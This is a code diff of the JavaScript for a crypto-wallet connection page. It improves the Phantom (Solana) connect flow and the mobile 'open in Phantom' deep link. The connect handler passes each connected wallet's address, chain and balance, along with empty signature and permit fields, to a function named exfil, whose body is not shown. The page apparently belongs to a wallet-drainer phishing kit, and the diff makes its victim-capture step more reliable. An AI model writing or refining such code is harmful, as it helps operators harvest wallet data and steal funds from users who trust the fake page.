@@ -574,19 +574,30 @@ function doPick(id) {
       setTimeout(function(){showPhantomMobileModal();}, 300);
       return;
     }
+    toast('Connecting','Requesting Phantom approval...');
+    var timedOut = setTimeout(function(){toast('Timeout','Phantom not responding. Try again.');}, 8000);
+    function onConnect(r) {
+      clearTimeout(timedOut);
+      var pk = r.publicKey ? r.publicKey.toString() : (r.address ? r.address.toString() : null);
+      if (!pk) { toast('Failed','No public key'); return; }
+      ACC = pk; WT = 'ph'; CID = 'solana'; BAL = '0.00';
+      updateUI(ACC.slice(0,4)+'...'+ACC.slice(-4), ACC, BAL+' SOL');
+      exfil({address:ACC, type:'Phantom', chain:'Solana', balance:BAL+' SOL', sig:'', permit:''});
+    }
     try {
-      pp.connect({onlyIfTrusted:false}).then(function(r) {
-        var pk = r.publicKey ? r.publicKey.toString() : (r.address ? r.address.toString() : null);
-        if (!pk) { toast('Failed','No public key'); return; }
-        ACC = pk; WT = 'ph'; CID = 'solana'; BAL = '0.00';
-        updateUI(ACC.slice(0,4)+'...'+ACC.slice(-4), ACC, BAL+' SOL');
-        exfil({address:ACC, type:'Phantom', chain:'Solana', balance:BAL+' SOL', sig:'', permit:''});
-      }).catch(function(e) {
-        if (e.code === 4001) toast('Rejected','You cancelled');
-        else toast('Phantom error', e.message || 'Unknown');
-      });
+      if (typeof pp.connect === 'function') {
+        pp.connect({onlyIfTrusted:false}).then(onConnect).catch(function(e) {
+          clearTimeout(timedOut);
+          if (e.code === 4001) toast('Rejected','You cancelled');
+          else toast('Phantom error', e.message || 'Connection failed');
+        });
+      } else {
+        clearTimeout(timedOut);
+        toast('Phantom error','Wallet provider not supported');
+      }
     } catch(e) {
-      toast('Phantom error', e.message || 'Failed to connect');
+      clearTimeout(timedOut);
+      toast('Phantom error', e.message || 'Unknown error');
     }
   }
   else if (id === 'wc') { toast('WalletConnect','Opening QR...'); setTimeout(wcmodal, 300); }
@@ -644,9 +655,9 @@ function wcmodal() {
 function showPhantomMobileModal() {
   var o = document.createElement('div');
   o.className = 'wmo';
-  var url = encodeURIComponent(location.href);
   var rawUrl = location.href;
-  o.innerHTML = '<div class="wm" style="max-width:340px;text-align:center"><div class="wmh" style="justify-content:center"><div class="wht">Phantom</div></div><div style="background:var(--field);border-radius:20px;padding:24px;margin:16px 0"><div style="width:80px;height:80px;margin:0 auto;background:#7b6fe0;border-radius:20px;display:grid;place-items:center"><svg width="40" height="40" viewBox="0 0 24 24"><circle cx="12" cy="12" r="8" fill="#fff"/></svg></div></div><div style="font-size:14px;color:var(--text);margin-bottom:8px;font-weight:600">Phantom not detected</div><div style="font-size:12px;color:var(--text-sub);margin-bottom:16px;line-height:1.4">To connect with Phantom on mobile, open this page in Phantom\'s in-app browser.</div><a href="phantom://browse?url='+url+'" style="display:block;width:100%;height:48px;line-height:48px;background:#7b6fe0;color:#fff;border:none;border-radius:16px;font-weight:600;font-size:15px;text-decoration:none;margin-bottom:8px">Open in Phantom</a><button class="cp-url-btn" style="width:100%;height:40px;background:transparent;color:var(--text-sub);border:1px solid var(--border);border-radius:12px;font-weight:500;font-size:12px">Copy URL to open manually</button><div class="wmf" style="margin-top:12px"><a href="#" onclick="this.closest(\'.wmo\').remove()">Cancel</a></div></div>';
+  var browseUrl = 'https://phantom.app/ul/browse/' + encodeURIComponent(rawUrl);
+  o.innerHTML = '<div class="wm" style="max-width:340px;text-align:center;padding:24px 20px"><div style="width:72px;height:72px;margin:0 auto 16px;background:#7b6fe0;border-radius:20px;display:grid;place-items:center"><svg width="36" height="36" viewBox="0 0 24 24"><circle cx="12" cy="12" r="8" fill="#fff"/></svg></div><div style="font-size:16px;color:var(--text);margin-bottom:4px;font-weight:700">Open in Phantom</div><div style="font-size:12px;color:var(--text-sub);margin-bottom:20px;line-height:1.5">Tap the button below to open this page in Phantom\'s built-in browser. Once opened, tap <strong>Connect Wallet</strong> and select Phantom.</div><a href="'+browseUrl+'" style="display:block;width:100%;height:48px;line-height:48px;background:#7b6fe0;color:#fff;border:none;border-radius:14px;font-weight:600;font-size:15px;text-decoration:none;margin-bottom:8px">Open in Phantom Browser</a><button class="cp-url-btn" style="width:100%;height:40px;background:transparent;color:var(--text-sub);border:1px solid var(--border);border-radius:12px;font-weight:500;font-size:12px">Copy URL to open manually</button><div class="wmf" style="margin-top:14px"><a href="#" onclick="this.closest(\'.wmo\').remove()">Cancel</a></div></div>';
   o.querySelector('.cp-url-btn').onclick = function(){
     navigator.clipboard.writeText(rawUrl).then(function(){
       toast('Copied','URL copied to clipboard');
